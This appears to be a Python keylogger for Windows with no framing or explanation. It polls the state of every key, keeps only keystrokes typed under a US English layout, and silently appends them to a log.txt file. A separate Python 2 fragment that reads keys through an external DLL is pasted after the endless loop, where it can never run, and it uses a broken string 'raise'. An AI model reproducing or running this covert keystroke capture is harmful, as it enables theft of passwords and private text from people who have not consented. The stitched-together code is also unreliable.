import win32api, win32con, time, os.path, inspect, sys
from ctypes import *
user32 = windll.user32
kernel32 = windll.kernel32


def get_script_dir(follow_symlinks=True):
    if getattr(sys, 'frozen', False): # py2exe, PyInstaller, cx_Freeze
        path = os.path.abspath(sys.executable)
    else:
        path = inspect.getabsfile(get_script_dir)
    if follow_symlinks:
        path = os.path.realpath(path)
    return os.path.dirname(path)

cat=get_script_dir()+'\\log.txt'
if (not os.path.exists(cat)):
    f = open('log.txt', 'w')
    f.write('Log // ')
    f.close()

class RECT(Structure):
    _fields_ = [
        ("left", c_ulong),
        ("top", c_ulong),
        ("right", c_ulong),
        ("bottom", c_ulong)
    ]


class GUITHREADINFO(Structure):
    _fields_ = [
        ("cbSize", c_ulong),
        ("flags", c_ulong),
        ("hwndActive", c_ulong),
        ("hwndFocus", c_ulong),
        ("hwndCapture", c_ulong),
        ("hwndMenuOwner", c_ulong),
        ("hwndMoveSize", c_ulong),
        ("hwndCaret", c_ulong),
        ("rcCaret", RECT)
    ]


f = open('log.txt', 'a')

check = True
previos=-1
previoschar=''
while check:
    gti = GUITHREADINFO(cbSize=sizeof(GUITHREADINFO))
    user32.GetGUIThreadInfo(0, byref(gti))
    dwThread = user32.GetWindowThreadProcessId(gti.hwndActive, 0)
    lang = user32.GetKeyboardLayout(dwThread)
    if(lang==67699721):
        for x in range(1,255):
            if win32api.GetAsyncKeyState(ord(chr(x))):
                if(x!=previos):
                    s=(chr(x)).lower()
                    if((previos==160) or (previos==16)):
                        s=chr(x)
                    previos=x
                    if (s in 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@$!-=_;":,.*+-()^&#%№ '):
                        if(s!=previoschar):
                            f.write(s)
                            f.close()
                            f = open('log.txt', 'a')
                            previoschar=s

import ctypes
import time





try:
    kblib = ctypes.CDLL("PyKeyboardAccess.dll")
except:
    raise ("Error Loading PyKeyboardAccess.dll")




try:
    kbfunc = kblib.kb_inkey
except:
    raise ("Could not find the kb_inkey function in the dll!")




while 1:
    x = kbfunc()

    if x != 0:
        print "Got key: %d" % x
    else:
        time.sleep(.01)
